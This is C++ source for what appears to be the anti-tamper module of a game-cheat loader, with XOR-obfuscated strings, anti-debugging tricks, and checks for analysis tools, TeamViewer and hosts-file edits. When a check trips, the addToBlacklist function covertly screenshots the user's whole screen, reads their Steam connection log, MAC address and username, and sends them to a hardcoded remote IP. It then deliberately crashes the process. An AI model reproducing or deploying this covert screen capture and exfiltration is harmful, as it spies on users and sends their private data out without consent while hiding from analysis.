#include "main.h"


inline std::string getUsername()
{
	CHAR pszBufUser[256];
	ULONG ulSize = sizeof(pszBufUser);

	if (!GetUserNameHidden(pszBufUser, (LPDWORD)ulSize))
		return /*error*/XorStr<0xA7, 6, 0xC043E7A3>("\xC2\xDA\xDB\xC5\xD9" + 0xC043E7A3).s;

	return pszBufUser;
}


int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT num = 0; // number of image encoders
	UINT size = 0; // size of the image encoder array in bytes

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
	{
		return -1; // Failure
	}

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
	{
		return -1; // Failure
	}

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j; // Success
		}
	}

	free(pImageCodecInfo);
	return -1; // Failure
}

void BitmapToJpg(HBITMAP hbmpImage, int width, int height)
{
	Bitmap *p_bmp = Bitmap::FromHBITMAP(hbmpImage, NULL);
	//Bitmap *p_bmp = new Bitmap(width, height, PixelFormat32bppARGB);
	CLSID pngClsid;
	int result = GetEncoderClsid(L"image/jpeg", &pngClsid);
	if (result != -1)
		std::cout << "Encoder succeeded" << std::endl;
	else
		std::cout << "Encoder failed" << std::endl;
	p_bmp->Save(L"screen.jpg", &pngClsid, NULL);
	
	//SetFileAttributes("screen.jpg", FILE_ATTRIBUTE_HIDDEN);

	delete p_bmp;
}

bool ScreenCapture(int x, int y, int width, int height, char *filename)
{
	HDC hDc = CreateCompatibleDC(0);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
	BitmapToJpg(hBmp, width, height);
	DeleteObject(hBmp);
	return true;
}

//Credits: http://softwaredevelopment.gr/1823/http-post-and-get-requests-with-wininet-and-c/ for post shit with wininet
#define POST 1
#define GET 0
inline void Request(int Method, LPCSTR Host, LPCSTR url, LPCSTR header, const char* data)
{
	try{
		//Retrieve default http user agent
		char httpUseragent[512];
		DWORD szhttpUserAgent = sizeof(httpUseragent);
		ObtainUserAgentStringHidden(0, httpUseragent, &szhttpUserAgent);

		char m[5];

		if (Method == GET)
			strcpy(m, "GET\0");
		else
			strcpy(m, "POST\0");
				
		HINTERNET internet = InternetOpenA(httpUseragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (internet != NULL)
		{			
			HINTERNET connect = InternetConnectA(internet, Host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
			if (connect != NULL)
			{				
				HINTERNET request = HttpOpenRequestA(connect, m, url, "HTTP/1.1", NULL, NULL,
					INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
					INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
					INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
					INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
					INTERNET_FLAG_NO_AUTH |
					INTERNET_FLAG_NO_CACHE_WRITE |
					INTERNET_FLAG_NO_UI |
					INTERNET_FLAG_PRAGMA_NOCACHE |
					INTERNET_FLAG_RELOAD, NULL);

				if (request != NULL)
				{
					int datalen = 0;
					if (data != NULL) datalen = strlen(data);
					int headerlen = 0;
					if (header != NULL) headerlen = strlen(header);
									
					HttpSendRequestA(request, header, headerlen, (char*)data, datalen);										
					InternetCloseHandle(request);
				}
			}
			InternetCloseHandle(connect);
		}
		InternetCloseHandle(internet);
	}
	catch (...) {}
}

std::string ReadFileIntoByteArray(PCHAR fileName)
{
	std::string sNoob;
	size_t iLen;
	std::ifstream fl(fileName, std::ios::binary);

	if (fl)
	{
		fl.seekg(0, std::ios::end);

		iLen = fl.tellg();

		sNoob.reserve(iLen);

		fl.seekg(0, std::ios::beg);

		sNoob.assign((std::istreambuf_iterator<char>(fl)),
			std::istreambuf_iterator<char>());

		fl.close();
	}


	return sNoob;
}

inline bool exist(const std::string& name)
{
	std::ifstream file(name);
	if (!file)            // If the file was not found, then file is 0, i.e. !file=1 or true.
		return false;    // The file was not found.
	else                 // If the file was found, then file is non-0.
		return true;     // The file was found.
}

inline std::string get_file_contents(const char *filename)
{
	std::ifstream in(filename, std::ios::in | std::ios::binary);
	if (in)
	{
		return(std::string((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>()));
	}
	throw(errno);
}

inline std::string getConnectionLog()
{
	TCHAR pszProgramPath[MAX_PATH];

	SHGetFolderPath(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, pszProgramPath);


	strcat(pszProgramPath, /*\\Steam\\logs\\connection_log.txt*/XorStr<0xB8, 31, 0x0F0ECCD3>("\xE4\xEA\xCE\xDE\xDD\xD0\xE2\xD3\xAF\xA6\xB1\x9F\xA7\xAA\xA8\xA9\xAD\xAA\xBE\xA2\xA3\xA3\x91\xA3\xBF\xB6\xFC\xA7\xAC\xA1" + 0x0F0ECCD3).s);
	std::cout << pszProgramPath << std::endl;

	if (exist(pszProgramPath))
		return get_file_contents(pszProgramPath);
	else
		return "nolog";
}

inline void addToBlacklist(const char* pszReason)
{
	std::cout << "blacklist" << std::endl;
	std::string sMAC;
	g_Login.GetMACAddress(sMAC);

	std::string sUsername = getUsername();

		GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	int x1 = 0;
	int y1 = 0;
	int x2 = GetSystemMetrics(SM_CXSCREEN);
	int y2 = GetSystemMetrics(SM_CYSCREEN);
	ScreenCapture(x1, y1, x2 - x1, y2 - y1, "screen.jpg");
	//Shutdown GDI+
	GdiplusShutdown(gdiplusToken);

	std::string sScreen = ReadFileIntoByteArray("screen.jpg");
	std::string sLog = getConnectionLog();
	std::cout << sLog << std::endl;
	//std::cout << encoded << std::endl;	
	std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(sScreen.c_str()), sScreen.length());

	std::string sMacEncoded = base64_encode(reinterpret_cast<const unsigned char*>(sMAC.c_str()), sMAC.length());
	std::string sLogEncoded = base64_encode(reinterpret_cast<const unsigned char*>(sLog.c_str()), sLog.length());	

	std::string data = "img=" + encoded + "&hwid="+sMacEncoded + "&log="+sLogEncoded;

	Request(POST, /*37.187.236.54*/XorStr<0x72, 14, 0xE72C8947>("\x41\x44\x5A\x44\x4E\x40\x56\x4B\x49\x4D\x52\x48\x4A" + 0xE72C8947).s, /*_INTERWEBZ/login/screen.php*/XorStr<0x16, 28, 0x1F099CDA>("\x49\x5E\x56\x4D\x5F\x49\x4B\x58\x5C\x45\x0F\x4D\x4D\x44\x4D\x4B\x09\x54\x4B\x5B\x4F\x4E\x42\x03\x5E\x47\x40" + 0x1F099CDA).s, /*Content-Type: application/x-www-form-urlencoded*/XorStr<0x7E, 48, 0x6F03AE62>("\x3D\x10\xEE\xF5\xE7\xED\xF0\xA8\xD2\xFE\xF8\xEC\xB0\xAB\xED\xFD\xFE\xE3\xF9\xF2\xF3\xE7\xFD\xFA\xF8\xB8\xE0\xB4\xED\xEC\xEB\xB0\xF8\xF0\xD2\xCC\x8F\xD6\xD6\xC9\xC3\xC9\xCB\xC6\xCE\xCE\xC8" + 0x6F03AE62).s, data.c_str());
	
	char request[512];
	sprintf_s(request, /*_INTERWEBZ/login/blacklist.php?username=%s&hwid=%s&reason=%s&hackID=%i&version=%i*/XorStr<0x97, 82, 0x3290C6C6>("\xC8\xD1\xD7\xCE\xDE\xCE\xCA\xDB\xDD\xFA\x8E\xCE\xCC\xC3\xCC\xC8\x88\xCA\xC5\xCB\xC8\xC7\xC1\xC7\xDC\xC4\x9F\xC2\xDB\xC4\x8A\xC3\xC4\xDD\xCB\xD4\xDA\xD1\xD8\x83\x9A\xB3\xE7\xAA\xB4\xAD\xA1\xFB\xE2\xBB\xEF\xB8\xAE\xAD\xBE\xA1\xA1\xED\xF4\xA1\xF5\xBC\xB4\xB5\xBC\x91\x9D\xE7\xFE\xB5\xFB\xA8\xBA\x92\x92\x8B\x8C\x8A\xD8\xC3\x8E" + 0x3290C6C6).s, sUsername.c_str(), sMAC.c_str(), pszReason, 1, 11);
	std::cout << request << std::endl;
	g_Winsock.InitWinsock();
	g_Winsock.Connect(/*37.187.236.54*/XorStr<0xDB, 14, 0x41843CD4>("\xE8\xEB\xF3\xEF\xE7\xD7\xCF\xD0\xD0\xD2\xCB\xD3\xD3" + 0x41843CD4).s);
	CString cstrResponse;
	g_Winsock.SendHttpGet(request, cstrResponse);
	g_Winsock.Disconnect();
	g_Winsock.CleanUp();


	for (long long int i = 0; ++i; (&i)[i] = i);

}

//=====================================================================================
//ANTI DEBUG GOES HERE

inline BOOL CheckDebugFlags()
{
	NTSTATUS status;
	DWORD NoDebugInherit = 0;

	status = NtQueryInformationProcessHidden(GetCurrentProcessHidden(), 0x1f, &NoDebugInherit, 4, NULL);

	if (status != 0x00000000)
		return FALSE;

	if (NoDebugInherit == FALSE)
		return TRUE;

	return FALSE;
}

inline BOOL CheckDebugObject()
{
	HANDLE hDebugObject = NULL;
	NTSTATUS status;

	status = NtQueryInformationProcessHidden(GetCurrentProcessHidden(), 0x1e, &hDebugObject, 4, NULL);

	if (status != 0x00000000)
		return FALSE;

	if (hDebugObject)
		return TRUE;
	else
		return FALSE;

}

inline BOOL HideThread()
{
	NTSTATUS status;

	status = NtSetInformationThreadHidden(GetCurrentThreadHidden(), 0x11, 0, 0);

	if (status != 0x00000000)
		return false;
	else
		return true;
}

inline BOOL CanOpenCsrss()
{
	HANDLE hCsrss = 0;

	hCsrss = OpenProcessHidden(PROCESS_ALL_ACCESS, FALSE, g_Injection.GetProcessIdByName(/*csrss.exe*/XorStr<0x23, 10, 0x1CABC8F1>("\x40\x57\x57\x55\x54\x06\x4C\x52\x4E" + 0x1CABC8F1).s));

	if (hCsrss != NULL)
	{
		CloseHandleHidden(hCsrss);
		return TRUE;
	}
	else
		return FALSE;

}

inline bool Int2DCheck()
{
	__try
	{
		__asm
		{
			int 0x2d
				xor eax, eax
				add eax, 2
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}

	return true;
}

inline bool IsDbgPresentPrefixCheck()
{
	__try
	{
		__asm __emit 0xF3 // 0xF3 0x64 disassembles as PREFIX REP:
		__asm __emit 0x64
		__asm __emit 0xF1 // One byte INT 1
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}

	return true;
}

inline bool checkGlobalFlags() 
{
	DWORD NtGlobalFlags;
	__asm
	{
			mov eax, fs:[30h]
			mov eax, [eax + 68h]
			mov NtGlobalFlags, eax
	}

	if (NtGlobalFlags & 0x70)
		return true;

	return false;
}

inline void checkHost()
{
	char path[MAX_PATH];

	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL, 0, path)))
	{
		strcat(path, /*\\drivers\\etc\\hosts*/XorStr<0xD5, 19, 0xB2214A5E>("\x89\xB2\xA5\xB1\xAF\xBF\xA9\xAF\x81\xBB\xAB\x83\xBD\x8A\x8C\x97\x91\x95" + 0xB2214A5E).s);
		
		std::string log;
		std::ifstream file;

		file.open(path);
		while (getline(file, log))
		{
			if (strstr(log.c_str(), /*interwebz*/XorStr<0x4B, 10, 0x6EE0BDF6>("\x22\x22\x39\x2B\x3D\x27\x34\x30\x29" + 0x6EE0BDF6).s)){
				addToBlacklist(/*host file*/XorStr<0x95, 10, 0x3BB82C50>("\xFD\xF9\xE4\xEC\xB9\xFC\xF2\xF0\xF8" + 0x3BB82C50).s);			
			}
		}
		file.close();
	}
}


inline void checkWireshark()
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int cDrivers, i;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		TCHAR szDriver[1024];
		cDrivers = cbNeeded / sizeof(drivers[0]);

		for (i = 0; i < cDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
			{
				if (strcmp(szDriver, /*npf.sys*/XorStr<0x6B, 8, 0x40100F3F>("\x05\x1C\x0B\x40\x1C\x09\x02" + 0x40100F3F).s) == 0)
				{
					MessageBoxHidden(0, /*Please uninstall Wireshark to use Interwebz*/XorStr<0xE3, 44, 0x051048FE>("\xB3\x88\x80\x87\x94\x8D\xC9\x9F\x85\x85\x83\x9D\x9B\x91\x9D\x9E\xD3\xA3\x9C\x84\x92\x8B\x91\x9B\x89\x97\xDD\x8A\x90\x20\x74\x71\x66\x24\x4C\x68\x73\x6D\x7B\x7D\x6E\x6E\x77" + 0x051048FE).s,/*Wireshark*/XorStr<0x23, 10, 0xB6928946>("\x74\x4D\x57\x43\x54\x40\x48\x58\x40" + 0xB6928946).s, 0);
					ExitProcessHidden(0);
				}
			}
		}
	}
}

LONG WINAPI UnhandledExcepFilter(PEXCEPTION_POINTERS pExcepPointers)
{
	SetUnhandledExceptionFilterHidden((LPTOP_LEVEL_EXCEPTION_FILTER)
		pExcepPointers->ContextRecord->Eax);

	pExcepPointers->ContextRecord->Eip += 2;

	return EXCEPTION_CONTINUE_EXECUTION;
}


inline void walkProcessList()
{
	std::vector<std::string> m_processList;
	m_processList.push_back(/*ollydbg.exe*/XorStr<0x03, 12, 0xD6009B1D>("\x6C\x68\x69\x7F\x63\x6A\x6E\x24\x6E\x74\x68" + 0xD6009B1D).s);
	m_processList.push_back(/*wireshark.exe*/XorStr<0x58, 14, 0x9A099587>("\x2F\x30\x28\x3E\x2F\x35\x3F\x2D\x0B\x4F\x07\x1B\x01" + 0x9A099587).s);
	m_processList.push_back(/*lordpe.exe*/XorStr<0xDF, 11, 0xAC8BF493>("\xB3\x8F\x93\x86\x93\x81\xCB\x83\x9F\x8D" + 0xAC8BF493).s);
	m_processList.push_back(/*hookshark.exe*/XorStr<0x7E, 14, 0x32799422>("\x16\x10\xEF\xEA\xF1\xEB\xE5\xF7\xED\xA9\xED\xF1\xEF" + 0x32799422).s);
	m_processList.push_back(/*idag.exe*/XorStr<0x4D, 9, 0x344CC654>("\x24\x2A\x2E\x37\x7F\x37\x2B\x31" + 0x344CC654).s);

	for (unsigned int ax = 0; ax < m_processList.size(); ax++)
	{
		std::string sProcess = m_processList.at(ax);
		if (g_Injection.GetProcessIdByName(sProcess.c_str()) != 0)
		{
			addToBlacklist(sProcess.c_str());			
		}
	}
}

inline void doChecks()
{
	if (g_Injection.GetProcessIdByName(/*TeamViewer.exe*/XorStr<0xEA, 15, 0xAA1B8028>("\xBE\x8E\x8D\x80\xB8\x86\x95\x86\x97\x81\xDA\x90\x8E\x92" + 0xAA1B8028).s) != 0)
	{
		MessageBoxHidden(0, /*Please close Teamviewer*/XorStr<0xCE, 24, 0x5CDEC0C1>("\x9E\xA3\xB5\xB0\xA1\xB6\xF4\xB6\xBA\xB8\xAB\xBC\xFA\x8F\xB9\xBC\xB3\xA9\x89\x84\x95\x86\x96" + 0x5CDEC0C1).s,/*TeamViewer*/XorStr<0x9E, 11, 0xA25B2855>("\xCA\xFA\xC1\xCC\xF4\xCA\xC1\xD2\xC3\xD5" + 0xA25B2855).s, 0);
		ExitProcessHidden(0);
		int* p = 0;
		*p = 0;
	}

	HANDLE hModule = GetModuleHandleHidden(/*tv_w32.dll*/XorStr<0x5F, 11, 0x0FE0190B>("\x2B\x16\x3E\x15\x50\x56\x4B\x02\x0B\x04" + 0x0FE0190B).s);

	if (hModule != 0)
	{
		MessageBoxHidden(0, /*Please close Teamviewer*/XorStr<0xCE, 24, 0x5CDEC0C1>("\x9E\xA3\xB5\xB0\xA1\xB6\xF4\xB6\xBA\xB8\xAB\xBC\xFA\x8F\xB9\xBC\xB3\xA9\x89\x84\x95\x86\x96" + 0x5CDEC0C1).s,/*TeamViewer*/XorStr<0x9E, 11, 0xA25B2855>("\xCA\xFA\xC1\xCC\xF4\xCA\xC1\xD2\xC3\xD5" + 0xA25B2855).s, 0);
		ExitProcessHidden(0);
		int* p = 0;
		*p = 0;
	}

	checkWireshark();
	checkHost();

	walkProcessList();

	SetUnhandledExceptionFilter(UnhandledExcepFilter);
	__asm{xor eax, eax}
	__asm{div eax}

	if (Int2DCheck() || IsDbgPresentPrefixCheck())
		addToBlacklist(/*API Check*/XorStr<0x09, 10, 0xAEEB3AF8>("\x48\x5A\x42\x2C\x4E\x66\x6A\x73\x7A" + 0xAEEB3AF8).s);

	if (CheckDebugObject())
		addToBlacklist(/*Debug Object*/XorStr<0x19, 13, 0xCAFB47C2>("\x5D\x7F\x79\x69\x7A\x3E\x50\x42\x4B\x47\x40\x50" + 0xCAFB47C2).s);

	if (CheckDebugFlags())
		addToBlacklist(/*Debug Flags*/XorStr<0x9C, 12, 0x91B7FDB6>("\xD8\xF8\xFC\xEA\xC7\x81\xE4\xCF\xC5\xC2\xD5" + 0x91B7FDB6).s);

	if (checkGlobalFlags())
		addToBlacklist(/*Global Flags*/XorStr<0xFE, 13, 0x850C0D54>("\xB9\x93\x6F\x63\x63\x6F\x24\x43\x6A\x66\x6F\x7A" + 0x850C0D54).s);

}
void securityThread(LPARAM lpParam)
{
	while (true)
	{
		doChecks();
	}
}

void initSecurity()
{
	doChecks();
	CreateThreadHidden(NULL, NULL, (LPTHREAD_START_ROUTINE)securityThread, NULL, NULL, NULL);
}